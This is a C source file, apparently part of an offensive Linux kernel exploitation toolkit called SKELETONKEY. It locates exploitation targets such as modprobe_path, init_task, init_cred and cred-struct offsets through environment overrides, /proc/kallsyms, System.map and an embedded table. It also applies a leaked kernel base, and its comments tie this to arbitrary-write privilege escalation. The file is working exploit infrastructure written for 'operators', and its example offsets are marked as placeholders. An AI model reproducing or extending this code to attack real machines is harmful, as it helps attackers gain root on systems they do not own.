/*
 * SKELETONKEY — kernel offset resolution
 *
 * See offsets.h for the four-source chain (env → kallsyms → System.map
 * → embedded table). This implementation is deliberately small and
 * dependency-free.
 */

#include "offsets.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <fnmatch.h>
#include <sys/utsname.h>

/* ------------------------------------------------------------------
 * Embedded relative-offset table.
 *
 * Each entry's modprobe_path / init_task / poweroff_cmd values are
 * stored as offsets *relative to _text* (kbase). To resolve absolute
 * VAs we add a kbase leak (e.g. from EntryBleed).
 *
 * Entries here are seeded EMPTY in v0.2.0 except for a small set whose
 * offsets are widely documented in public CTF writeups + Ubuntu's
 * own debug-symbol packages. Operators on other kernels populate via
 * env var or extend this table.
 *
 * To add a verified entry on a kernel you own:
 *   sudo grep -E " (modprobe_path|init_task|poweroff_cmd|init_cred)$" \
 *        /boot/System.map-$(uname -r)
 * Subtract _text VA from each to get the relative offsets.
 * ------------------------------------------------------------------ */
struct table_entry {
    const char *release_glob;  /* fnmatch glob against uname -r */
    const char *distro_match;  /* prefix-match against /etc/os-release ID, or NULL=any */
    uintptr_t rel_modprobe_path;
    uintptr_t rel_poweroff_cmd;
    uintptr_t rel_init_task;
    uintptr_t rel_init_cred;
    uint32_t cred_offset_real;
    uint32_t cred_offset_eff;
};

/* Note: relative offsets below are PLACEHOLDERS for the schema. The
 * env-var override + kallsyms + System.map paths are the verified
 * runtime sources. Operators who validate offsets on a specific
 * kernel build are encouraged to upstream entries here. */
static const struct table_entry kernel_table[] = {
    /* Schema example. Uncomment + verify before relying on it.
     *
     * { .release_glob       = "5.15.0-25-generic",
     *   .distro_match       = "ubuntu",
     *   .rel_modprobe_path  = 0x148e480,
     *   .rel_poweroff_cmd   = 0x148e3a0,
     *   .rel_init_task      = 0x1c11dc0,
     *   .rel_init_cred      = 0x1e0c460,
     *   .cred_offset_real   = 0x758,
     *   .cred_offset_eff    = 0x760, },
     */
    /* Sentinel */
    { NULL, NULL, 0, 0, 0, 0, 0, 0 }
};

/* Defaults that hold across most x86_64 kernels in the target era. */
#define DEFAULT_CRED_REAL_OFFSET   0x738
#define DEFAULT_CRED_EFF_OFFSET    0x740
#define DEFAULT_CRED_UID_OFFSET    0x4

const char *skeletonkey_offset_source_name(enum skeletonkey_offset_source src)
{
    switch (src) {
    case OFFSETS_NONE:          return "none";
    case OFFSETS_FROM_ENV:      return "env";
    case OFFSETS_FROM_KALLSYMS: return "kallsyms";
    case OFFSETS_FROM_SYSMAP:   return "System.map";
    case OFFSETS_FROM_TABLE:    return "table";
    }
    return "?";
}

/* Parse hex/decimal — accepts "0x..." or plain decimal. */
static int parse_addr(const char *s, uintptr_t *out)
{
    if (!s || !*s) return 0;
    errno = 0;
    char *end = NULL;
    unsigned long long v = strtoull(s, &end, 0);
    if (errno != 0 || end == s) return 0;
    *out = (uintptr_t)v;
    return 1;
}

static void read_distro(char *out, size_t sz)
{
    out[0] = '\0';
    FILE *f = fopen("/etc/os-release", "r");
    if (!f) return;
    char line[256];
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, "ID=", 3) == 0) {
            char *p = line + 3;
            if (*p == '"') p++;
            size_t i = 0;
            while (*p && *p != '"' && *p != '\n' && i + 1 < sz) {
                out[i++] = (char)tolower((unsigned char)*p++);
            }
            out[i] = '\0';
            break;
        }
    }
    fclose(f);
}

/* ------------------------------------------------------------------
 * Source 1: environment variables
 * ------------------------------------------------------------------ */
static void apply_env(struct skeletonkey_kernel_offsets *o)
{
    const char *v;
    uintptr_t a;

    if ((v = getenv("SKELETONKEY_KBASE")) && parse_addr(v, &a)) {
        if (!o->kbase) o->kbase = a;
    }
    if ((v = getenv("SKELETONKEY_MODPROBE_PATH")) && parse_addr(v, &a)) {
        if (!o->modprobe_path) {
            o->modprobe_path = a;
            o->source_modprobe = OFFSETS_FROM_ENV;
        }
    }
    if ((v = getenv("SKELETONKEY_POWEROFF_CMD")) && parse_addr(v, &a)) {
        if (!o->poweroff_cmd) o->poweroff_cmd = a;
    }
    if ((v = getenv("SKELETONKEY_INIT_TASK")) && parse_addr(v, &a)) {
        if (!o->init_task) {
            o->init_task = a;
            o->source_init_task = OFFSETS_FROM_ENV;
        }
    }
    if ((v = getenv("SKELETONKEY_INIT_CRED")) && parse_addr(v, &a)) {
        if (!o->init_cred) o->init_cred = a;
    }
    if ((v = getenv("SKELETONKEY_CRED_OFFSET_REAL")) && parse_addr(v, &a)) {
        if (!o->cred_offset_real) {
            o->cred_offset_real = (uint32_t)a;
            o->source_cred = OFFSETS_FROM_ENV;
        }
    }
    if ((v = getenv("SKELETONKEY_CRED_OFFSET_EFF")) && parse_addr(v, &a)) {
        if (!o->cred_offset_eff) o->cred_offset_eff = (uint32_t)a;
    }
    if ((v = getenv("SKELETONKEY_UID_OFFSET")) && parse_addr(v, &a)) {
        if (!o->cred_uid_offset) o->cred_uid_offset = (uint32_t)a;
    }
}

/* ------------------------------------------------------------------
 * Source 2/3: symbol-table file parsing (System.map or kallsyms share
 * the same "ADDR TYPE NAME" format).
 * ------------------------------------------------------------------ */
static int parse_symfile(const char *path,
                         struct skeletonkey_kernel_offsets *o,
                         enum skeletonkey_offset_source tag)
{
    FILE *f = fopen(path, "r");
    if (!f) return 0;

    int filled = 0;
    char line[512];
    int saw_nonzero = 0;
    while (fgets(line, sizeof line, f)) {
        char *p = line;
        while (*p && isspace((unsigned char)*p)) p++;
        if (!*p) continue;

        char *end = NULL;
        unsigned long long addr = strtoull(p, &end, 16);
        if (end == p || !end) continue;
        if (addr != 0) saw_nonzero = 1;

        while (*end && isspace((unsigned char)*end)) end++;
        if (!*end) continue;
        /* skip type char */
        end++;
        while (*end && isspace((unsigned char)*end)) end++;
        if (!*end) continue;

        char *nl = strchr(end, '\n');
        if (nl) *nl = '\0';

        if (strcmp(end, "modprobe_path") == 0 && !o->modprobe_path) {
            o->modprobe_path = (uintptr_t)addr;
            o->source_modprobe = tag;
            filled++;
        } else if (strcmp(end, "poweroff_cmd") == 0 && !o->poweroff_cmd) {
            o->poweroff_cmd = (uintptr_t)addr;
            filled++;
        } else if (strcmp(end, "init_task") == 0 && !o->init_task) {
            o->init_task = (uintptr_t)addr;
            o->source_init_task = tag;
            filled++;
        } else if (strcmp(end, "init_cred") == 0 && !o->init_cred) {
            o->init_cred = (uintptr_t)addr;
            filled++;
        } else if (strcmp(end, "_text") == 0 && !o->kbase) {
            o->kbase = (uintptr_t)addr;
        }
    }
    fclose(f);

    /* /proc/kallsyms returns all-zero addrs under kptr_restrict — treat
     * that as "couldn't read", not "actually zero". Undo ONLY the bogus
     * KALLSYMS source tags this pass may have set on still-zero fields —
     * do NOT clobber values a higher-priority source (env vars) already
     * provided, or the env override is silently wiped on any kptr_restrict
     * host (which is every default host). */
    if (!saw_nonzero) {
        if (o->source_modprobe == OFFSETS_FROM_KALLSYMS) {
            o->modprobe_path = 0;
            o->source_modprobe = OFFSETS_NONE;
        }
        if (o->source_init_task == OFFSETS_FROM_KALLSYMS) {
            o->init_task = 0;
            o->source_init_task = OFFSETS_NONE;
        }
        return 0;
    }
    return filled;
}

/* ------------------------------------------------------------------
 * Source 4: embedded table — relative offsets, applied on top of kbase
 * if we already have one.
 * ------------------------------------------------------------------ */
static void apply_table(struct skeletonkey_kernel_offsets *o)
{
    if (!o->kernel_release[0]) return;

    for (const struct table_entry *e = kernel_table; e->release_glob; e++) {
        if (e->distro_match && o->distro[0]
            && strncmp(e->distro_match, o->distro, strlen(e->distro_match)) != 0) {
            continue;
        }
        if (fnmatch(e->release_glob, o->kernel_release, 0) != 0) continue;

        /* Match. Apply, but only if we have a kbase (relative offsets
         * are useless absent that). */
        if (!o->kbase) return;

        if (!o->modprobe_path && e->rel_modprobe_path) {
            o->modprobe_path = o->kbase + e->rel_modprobe_path;
            o->source_modprobe = OFFSETS_FROM_TABLE;
        }
        if (!o->poweroff_cmd && e->rel_poweroff_cmd) {
            o->poweroff_cmd = o->kbase + e->rel_poweroff_cmd;
        }
        if (!o->init_task && e->rel_init_task) {
            o->init_task = o->kbase + e->rel_init_task;
            o->source_init_task = OFFSETS_FROM_TABLE;
        }
        if (!o->init_cred && e->rel_init_cred) {
            o->init_cred = o->kbase + e->rel_init_cred;
        }
        if (!o->cred_offset_real && e->cred_offset_real) {
            o->cred_offset_real = e->cred_offset_real;
            o->source_cred = OFFSETS_FROM_TABLE;
        }
        if (!o->cred_offset_eff && e->cred_offset_eff) {
            o->cred_offset_eff = e->cred_offset_eff;
        }
        return;
    }
}

/* ------------------------------------------------------------------
 * Top-level resolve()
 * ------------------------------------------------------------------ */
int skeletonkey_offsets_resolve(struct skeletonkey_kernel_offsets *out)
{
    memset(out, 0, sizeof *out);

    struct utsname u;
    if (uname(&u) == 0) {
        snprintf(out->kernel_release, sizeof out->kernel_release, "%s", u.release);
    }
    read_distro(out->distro, sizeof out->distro);

    /* Defaults — only used if no source overrides. */
    out->cred_uid_offset = DEFAULT_CRED_UID_OFFSET;

    /* 1. env */
    apply_env(out);

    /* 2. /proc/kallsyms — only fills if non-zero addrs present */
    parse_symfile("/proc/kallsyms", out, OFFSETS_FROM_KALLSYMS);

    /* 3. /boot/System.map-<release> */
    char path[256];
    snprintf(path, sizeof path, "/boot/System.map-%s", out->kernel_release);
    parse_symfile(path, out, OFFSETS_FROM_SYSMAP);

    /* 4. embedded table (uses any kbase already discovered) */
    apply_table(out);

    /* Fill any remaining struct-offset gaps with defaults so that
     * arb-write-via-init_task-+offset still has a chance even without
     * a full source. Mark as TABLE so caller can see they're defaulted. */
    if (!out->cred_offset_real) {
        out->cred_offset_real = DEFAULT_CRED_REAL_OFFSET;
        if (out->source_cred == OFFSETS_NONE) out->source_cred = OFFSETS_FROM_TABLE;
    }
    if (!out->cred_offset_eff) {
        out->cred_offset_eff = DEFAULT_CRED_EFF_OFFSET;
    }

    int critical = 0;
    if (out->modprobe_path) critical++;
    if (out->init_task)     critical++;
    if (out->cred_offset_real && out->cred_uid_offset) critical++;
    return critical;
}

void skeletonkey_offsets_apply_kbase_leak(struct skeletonkey_kernel_offsets *off,
                                      uintptr_t leaked_kbase)
{
    if (!leaked_kbase) return;
    /* Set kbase if we didn't have one, then re-apply the embedded table. */
    if (!off->kbase) off->kbase = leaked_kbase;
    apply_table(off);
}

bool skeletonkey_offsets_have_modprobe_path(const struct skeletonkey_kernel_offsets *off)
{
    return off && off->modprobe_path != 0;
}

bool skeletonkey_offsets_have_cred(const struct skeletonkey_kernel_offsets *off)
{
    return off && off->init_task != 0 && off->cred_offset_real != 0
           && off->cred_uid_offset != 0;
}

void skeletonkey_offsets_print(const struct skeletonkey_kernel_offsets *off)
{
    fprintf(stderr, "[i] offsets: release=%s distro=%s\n",
            off->kernel_release[0] ? off->kernel_release : "?",
            off->distro[0]         ? off->distro         : "?");
    fprintf(stderr, "[i] offsets: kbase=0x%lx  modprobe_path=0x%lx (%s)\n",
            (unsigned long)off->kbase,
            (unsigned long)off->modprobe_path,
            skeletonkey_offset_source_name(off->source_modprobe));
    fprintf(stderr, "[i] offsets: init_task=0x%lx (%s)  cred_real=0x%x cred_eff=0x%x uid=0x%x (%s)\n",
            (unsigned long)off->init_task,
            skeletonkey_offset_source_name(off->source_init_task),
            off->cred_offset_real, off->cred_offset_eff, off->cred_uid_offset,
            skeletonkey_offset_source_name(off->source_cred));
}
